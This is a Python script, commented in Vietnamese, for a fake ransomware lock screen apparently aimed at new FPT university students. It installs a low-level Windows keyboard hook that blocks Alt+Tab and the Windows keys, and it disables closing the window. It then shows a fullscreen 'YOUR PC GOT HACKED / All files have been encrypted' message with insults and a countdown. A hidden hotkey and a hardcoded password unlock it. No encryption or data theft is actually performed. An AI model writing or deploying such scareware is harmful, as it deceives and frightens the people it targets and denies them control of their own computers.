import ctypes
from ctypes import wintypes
import win32con
import tkinter as tk
from tkinter import simpledialog
from PIL import Image, ImageTk
import threading
import os

# --- CẤU HÌNH ---
IMAGE_FILENAME = "fsociety.png"  # Tên file ảnh cùng folder
COUNTDOWN_SECONDS = 3*1    # 15 phút (cho test, có thể chỉnh lại)
EXIT_PASSWORD = "123456"

# --- WINDOWS API ĐỂ CHẶN PHÍM (Alt+Tab, Phím Windows) ---
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_longlong, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)

keyboard_hook = None

def low_level_keyboard_handler(nCode, wParam, lParam):
    """ Hàm callback bắt và chặn các phím hệ thống """
    if nCode >= 0:
        vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value
        flags = ctypes.cast(lParam + 8, ctypes.POINTER(ctypes.c_ulong)).contents.value
        alt_pressed = (flags & 0x20) != 0

        # Chặn Alt + Tab
        if vk_code == win32con.VK_TAB and alt_pressed:
            return 1
        
        # Chặn phím Windows (LWin, RWin)
        if vk_code in [win32con.VK_LWIN, win32con.VK_RWIN]:
            return 1

        # Chặn Alt + Esc
        if vk_code == win32con.VK_ESCAPE and alt_pressed:
            return 1

    return user32.CallNextHookEx(keyboard_hook, nCode, wParam, lParam)

def start_keyboard_hook():
    """ Khởi chạy bộ chặn phím trong một luồng (Thread) riêng biệt """
    global keyboard_hook
    pointer_callback = HOOKPROC(low_level_keyboard_handler)
    keyboard_hook = user32.SetWindowsHookExW(
        13,  # WH_KEYBOARD_LL
        pointer_callback,
        kernel32.GetModuleHandleW(None),
        0
    )
    
    # Vòng lặp nhận và xử lý thông điệp bàn phím từ hệ thống
    msg = wintypes.MSG()
    while user32.GetMessageW(ctypes.byref(msg), 0, 0, 0) != 0:
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageW(ctypes.byref(msg))

def stop_keyboard_hook():
    """ Gỡ bỏ bộ chặn phím khi thoát để trả lại trạng thái bình thường cho Windows """
    global keyboard_hook
    if keyboard_hook:
        user32.UnhookWindowsHookEx(keyboard_hook)
        keyboard_hook = None


# --- LỚP GIAO DIỆN CHÍNH ---
class FakeFsociety:
    def __init__(self, root):
        self.root = root
        self.remaining = COUNTDOWN_SECONDS

        root.title("fsociety")

        # Cấu hình Fullscreen và Luôn trên cùng cho màn hình chính (màn hình đen)
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)

        # Chặn nút X và Alt + F4
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        root.bind("<Alt-F4>", lambda e: "break")

        root.configure(bg="black")

        # Khởi chạy luồng chặn phím ngầm (Alt+Tab, Win)
        self.hook_thread = threading.Thread(target=start_keyboard_hook, daemon=True)
        self.hook_thread.start()

        # --- LẤY KÍCH THƯỚC VÀ HIỂN THỊ ẢNH ---
        self.logo_label = None
        
        try:
            # 1. Mở ảnh để lấy kích thước gốc
            current_folder = os.path.dirname(os.path.abspath(__file__))
            image_path = os.path.join(current_folder, IMAGE_FILENAME)
            
            with Image.open(image_path) as img:
                img_width, img_height = img.size
                
                # 2. Tạo đối tượng PhotoImage cho ảnh gốc
                self.logo = ImageTk.PhotoImage(img)

                # 3. Tạo một Frame con đặt chính giữa màn hình chính để chứa nội dung
                #    Nội dung này bao gồm ảnh và các dòng text bên dưới
                content_frame = tk.Frame(root, bg="black")
                content_frame.pack(expand=True)  # Sử dụng expand=True để Frame nằm giữa

                # 4. Hiển thị ảnh (size thật) bên trong Frame con
                logo_label = tk.Label(content_frame, image=self.logo, bg="black")
                logo_label.pack(pady=20)
                
                # --- PHẦN TEXT (NẰM TRONG CONTENT_FRAME) ---
                title = tk.Label(
                    content_frame,
                    text="ditmefpt",
                    fg="#00ff00",
                    bg="black",
                    font=("Consolas", 42, "bold")
                )
                title.pack()

                info = tk.Label(
                    content_frame,
                    text=(
                        "Chao cac tan sinh vien FPT\n\n"
                        "YOUR PC GOT HACKED\n"
                        "All files have been encrypted. Good Lucks!"
                    ),
                    fg="#00ff00",
                    bg="black",
                    font=("Consolas", 18)
                )
                info.pack(pady=10)

                # Nhãn hiển thị đếm ngược thời gian
                self.timer_label = tk.Label(
                    content_frame,
                    text="15:00",
                    fg="#00ff00",
                    bg="black",
                    font=("Consolas", 56, "bold")
                )
                self.timer_label.pack(pady=40)

        except Exception as e:
            # Nếu không tìm thấy ảnh hoặc có lỗi, hiển thị text thay thế (vẫn ở giữa)
            print(f"Lỗi khi tải ảnh: {e}")
            missing_frame = tk.Frame(root, bg="black")
            missing_frame.pack(expand=True)
            
            missing = tk.Label(
                missing_frame,
                text="[ image not found or error ]",
                fg="red",
                bg="black",
                font=("Consolas", 18)
            )
            missing.pack(pady=20)
            
            # --- PHẦN TEXT (DỰ PHÒNG - VẪN TRONG MISSING_FRAME) ---
            title = tk.Label(
                missing_frame,
                text="DIT ME FPT",
                fg="#00ff00",
                bg="black",
                font=("Consolas", 42, "bold")
            )
            title.pack()

            info = tk.Label(
                missing_frame,
                text=(
                    "Chao cac tan sinh vien FPT\n\n"
                    "YOUR PC GOT HACKED\n"
                    "All files have been encrypted. Good Lucks!"
                ),
                fg="#00ff00",
                bg="black",
                font=("Consolas", 18)
            )
            info.pack(pady=10)

            # Nhãn hiển thị đếm ngược thời gian (dự phòng)
            self.timer_label = tk.Label(
                missing_frame,
                text="15:00",
                fg="#00ff00",
                bg="black",
                font=("Consolas", 56, "bold")
            )
            self.timer_label.pack(pady=40)

        # Gợi ý nhỏ phía dưới (VẪN NẰM NGOÀI FRAME, Ở ĐÁY MÀN HÌNH FULLSCREEN)
        hint = tk.Label(
            root,
            text="Go fuck yourself please!",
            fg="gray",
            bg="black",
            font=("Consolas", 10)
        )
        hint.pack(side="bottom", pady=20)

        # Ràng buộc tổ hợp phím để mở hộp thoại nhập mật khẩu thoát
        root.bind("<Control-Shift-P>", self.secret_exit)

        # Bắt đầu vòng lặp đếm ngược
        self.update_timer()

    def secret_exit(self, event=None):
        # Tạm thời tắt thuộc tính "Luôn trên cùng" để hộp thoại Nhập mật khẩu hiển thị lên được
        self.root.attributes("-topmost", False)

        password = simpledialog.askstring(
            "Authentication",
            "Enter password:",
            show="*"
        )

        if password == EXIT_PASSWORD:
            # Nếu đúng mật khẩu, giải phóng hook và đóng app
            stop_keyboard_hook()
            self.root.destroy()
        else:
            # Nếu sai mật khẩu, bật lại chế độ Luôn trên cùng để khóa tiếp
            self.root.attributes("-topmost", True)

    def update_timer(self):
        mins = self.remaining // 60
        secs = self.remaining % 60

        self.timer_label.config(text=f"{mins:02}:{secs:02}")

        if self.remaining <= 0:
            stop_keyboard_hook()
            self.root.destroy()
            return

        self.remaining -= 1
        self.root.after(1000, self.update_timer)


# Chạy ứng dụng
if __name__ == "__main__":
    # Nhắc nhở: Phải có file fsociety.png trong cùng folder
    root = tk.Tk()
    app = FakeFsociety(root)
    
    try:
        root.mainloop()
    finally:
        # Cơ chế an toàn dự phòng: Luôn gỡ chặn phím khi cửa sổ chính đóng
        stop_keyboard_hook()